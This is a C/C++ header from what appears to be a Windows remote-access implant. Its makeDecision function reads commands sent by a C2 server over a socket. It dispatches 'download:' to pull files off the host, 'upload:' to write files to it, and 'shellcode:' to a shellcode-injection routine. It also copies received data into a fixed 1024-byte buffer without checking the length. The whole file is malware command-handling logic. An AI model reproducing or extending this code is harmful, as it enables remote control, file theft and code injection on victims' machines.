#pragma once
#include "downloadFile.h"
#include "uploadFile.h"
#include "injectShellcode.h"
#include <string>

/* This function is responsible for figuring out what to do based off the data sent by the C2 (calling download, upload functions etc.) */
int makeDecision(char *recv, int recvlen, SOCKET ClientSocket) {
	
	printf("This is the data that was recieved: %s\n", recv);
	printf("Length: %d\n", recvlen);

	if (strncmp(recv, "download:", strlen("download:")) == 0) {
		char file_path[1024];
		ZeroMemory(file_path, 1024);
		memcpy(file_path, &recv[9], recvlen-9);
		downloadFile(ClientSocket, file_path);
	}
	else if (strncmp(recv, "upload:", strlen("upload:")) == 0) {
		char file_path[1024];
		ZeroMemory(file_path, 1024);
		memcpy(file_path, &recv[7], recvlen - 7);
		uploadFile(ClientSocket, file_path);
	}
	else if (strncmp(recv, "shellcode:", strlen("shellcode:")) == 0) {
		BOOL spawnProc = true;
		int PID = 0; 
		BOOL unsafe = false;

		injectShellcode(spawnProc, PID, unsafe);
	}
	return 0;
}